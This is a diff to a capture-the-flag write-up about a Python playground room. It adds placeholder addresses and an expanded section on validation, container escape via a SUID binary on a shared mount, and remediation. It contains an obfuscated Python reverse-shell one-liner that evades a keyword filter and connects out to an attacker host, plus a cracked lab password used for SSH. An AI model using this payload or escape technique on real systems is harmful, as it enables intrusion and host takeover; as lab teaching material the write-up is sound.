@@ -14,7 +14,7 @@ checking the website there is not much info except bragging about their website 
 
 ```plaintext
 ===============================================================
-[+] Url:                     http://10.65.164.243
+[+] Url:                     http://MACHINE_IP
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                common.txt
@@ -54,7 +54,7 @@ there are security filters : using ( import , os ,socket ) is blocked but every 
 lets to try to run python reverse shell and listen to response :
 
 ```plaintext
-s = __import__("so" + "cket").socket(); s.connect(("192.168.192.250", 4000)); fd = s.fileno(); __import__("os").dup2(fd, 0); __import__("os").dup2(fd, 1); __import__("os").dup2(fd, 2); __import__("subprocess").call(["/bin/sh", "-i"])
+s = __import__("so" + "cket").socket(); s.connect(("ATTACKER_TUN0", 4000)); fd = s.fileno(); __import__("os").dup2(fd, 0); __import__("os").dup2(fd, 1); __import__("os").dup2(fd, 2); __import__("subprocess").call(["/bin/sh", "-i"])
 ```
 
 ```plaintext
@@ -85,7 +85,7 @@ spaghetti1245
 so after that lets try to ssh as connor with the "spaghetti1245" as a password
 
 ```plaintext
-ssh connor@10.65.164.243
+ssh connor@MACHINE_IP
 ```
 
 and with that i am logged as connor :
@@ -184,3 +184,50 @@ find / -name "*flag3.txt*" 2>/dev/null
 thats it :
 
 > thank you for reading!!
+
+## Expanded validation and container-boundary notes
+
+### 1. Establish the execution context
+
+The playground accepts Python input but applies restrictive filters to selected names and imports. A blacklist around words such as import, os, or socket is not a security sandbox: Python offers many routes to reach runtime objects, and text matching does not understand program semantics.
+
+Test only the room's application. Record the input, response, and exact error. Use a benign expression first to establish that the execution feature works, then compare how the filter reacts to the supplied challenge input. Do not infer remote command execution from the presence of a Python prompt alone.
+
+### 2. Validate the application boundary
+
+The recorded exercise demonstrates that string construction and Python's dynamic import behaviour can evade a naive text filter. The root cause is executing attacker-controlled Python in the server process, not merely an imperfect blacklist. In production, do not expose eval-like execution to untrusted users. Use a separate, disposable sandbox with strict CPU, memory, time, filesystem, and network limits if code execution is an actual product requirement.
+
+### 3. Reverse-shell evidence
+
+The original notes contain a lab-specific reverse-shell test. Keep its listener address aligned with the VPN/AttackBox interface shown in your own environment, and do not use an old address from a previous run. A callback proves that the target initiated a connection; it does not prove that the process has host-level root privileges.
+
+After receiving a shell, verify the identity and the environment:
+
+    whoami
+    id
+    hostname
+    pwd
+    cat /proc/1/cgroup
+    findmnt
+
+The cgroup and mount output can help identify containerization, but no single string is conclusive on every modern runtime. Compare process, filesystem, network, and mount context before concluding that you have crossed a container boundary.
+
+### 4. Investigate the second-stage credential clue
+
+The room's recorded transcript includes a custom two-pass letter-pair transformation. Preserve the exact ciphertext and algorithm from your active instance before decoding. Explain why the inverse function maps each character pair back to one character and validate the result in the lab rather than assuming a string is a password because it looks plausible.
+
+If a recovered credential is used for SSH, restrict it to the authorized target and avoid reusing it elsewhere.
+
+### 5. Understand the shared-mount escape
+
+The recorded path relies on a mount shared between the container and the host. A file created under the container's mounted path can therefore appear under a different path on the host. A SUID executable in such a shared host-visible path can cross a privilege boundary if the host permits the file and its SUID bit to be honoured.
+
+This is a severe configuration error. Modern container runtimes and mount options may suppress SUID or prohibit executable mounts, so the behaviour must be observed in this exact lab. Root inside a container is not automatically root on the host; the shared mount is the critical link in this chain.
+
+### 6. Evidence and cleanup
+
+Record the container identity, shared mount mapping, host identity, and the exact flag location. Do not install persistent keys or leave the SUID proof binary behind after the lab. Remove artifacts in the exercise environment when permitted.
+
+### 7. Remediation
+
+Avoid evaluating untrusted Python, isolate code execution, disable unnecessary network access, mount host directories read-only or not at all, use no-new-privileges, drop capabilities, and enforce seccomp/AppArmor or equivalent policy. Separate host and container ownership, and do not allow user-controlled files to become host-executable SUID programs.
